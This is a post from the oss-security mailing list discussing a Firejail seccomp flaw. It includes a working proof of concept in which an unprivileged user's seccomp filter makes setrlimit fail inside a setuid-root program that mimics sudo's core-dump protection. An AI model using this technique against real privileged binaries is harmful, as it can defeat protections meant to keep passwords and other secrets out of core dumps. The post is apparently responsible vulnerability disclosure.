  oss-security - Re: Re: Firejail local root exploit            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Sun, 08 Jan From: Martin Carpenter <mcarpenter@...e.fr> To: oss-security@...ts.openwall.com Subject: Re: Re: Firejail local root exploit  On Sat, at Martin Carpenter wrote: > prctl(PR_CAPBSET_DROP, ...) (see caps.c) requires CAP_SETPCAP.   Oops, I was looking at the wrong flag: PR_SECCOMP_SET doesn't require capabilities. Thanks sivmu.  So that... doesn't improve things, quite the opposite. Here's disable_coredumps() from sudo (as shipped with Ubuntu which does not disable suid coredumps on desktop by default):   /*   * Disable core dumps to avoid dropping a core with user password in it.   * We will reset this limit before executing the command.   * Not all operating systems disable core dumps for setuid processes.   */  static void  disable_coredumps(void)  {  #if defined(RLIMIT_CORE)      struct rlimit rl;      debug_decl(disable_coredumps, SUDO_DEBUG_UTIL)        /*       * Turn off core dumps?       */      if (sudo_conf_disable_coredump()) {      (void) getrlimit(RLIMIT_CORE, &corelimit);      memcpy(&rl, &corelimit, sizeof(struct rlimit));      rl.rlim_cur = 0;      (void) setrlimit(RLIMIT_CORE, &rl);      }      debug_return;  #endif /* RLIMIT_CORE */  }  The return value from setrlimit() at line is not checked.  PoC: two programs (below): foo, to set up a seccomp filter (using libseccomp) to fail calls to setrlimit() and then fork/exec bar, which duplicates disable_coredumps() above, setuid-root, All works as expected: a non-privileged user can prevent the call to setrlimit() in privileged bar and execution continues. (The filter is inherited since calls to fork, exec are not blocked).  Again we can probably push root cause off to sudo's failure to check the setrlimit() return value (or Ubuntu's defaults...) but pragmatically there just has to be more stuff out there like this. sudo was literally the first thing I looked at... Disabling filter inheritance across the privilege boundary doesn't seem like an obviously good solution(?).  OpenBSD's pledge(2), by contrast, only sends uncatchable-SIGABRT and pledges are not inherited by subprocesses, privileged or not.   $ cat foo.c  #include <linux/seccomp.h> #include <seccomp.h> #include <stdio.h> #include <sys/prctl.h> #include <sys/types.h> #include <sys/wait.h> #include <unistd.h>  int main(int argc, const char *argv[]) {   int status;   char *args[] = { "./bar", NULL };   scmp_filter_ctx ctx;   switch(fork()) {       case -1: /* error */           perror("fork");           return 1;           break;       case 0: /* child */           ctx = seccomp_init(SCMP_ACT_ALLOW); // permit all           seccomp_rule_add(ctx, SCMP_ACT_ERRNO(1), SCMP_SYS(setrlimit), 0); // blacklist setrlimit           seccomp_load(ctx);           execv(args[0], args);           perror("execv");           _exit(1);           break;       default:           if(-1 == wait(&status)) {               perror("wait");               return 1;           }           printf("exit code %d\n", WEXITSTATUS(status));   }   return 0;  } $ cat bar.c  #include <sys/time.h> #include <sys/resource.h> #include <string.h>  int main(int argc, const char *argv[]) {     struct rlimit rl;     struct rlimit corelimit;     (void) getrlimit(RLIMIT_CORE, &corelimit);     memcpy(&rl, &corelimit, sizeof(struct rlimit));     rl.rlim_cur = 0;     return setrlimit(RLIMIT_CORE, &rl) ? 2 : 0; } $ gcc -o foo foo.c -lseccomp $ gcc -o bar bar.c $ sudo chown root bar $ sudo chmod bar $ ./foo  exit code 2 $    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      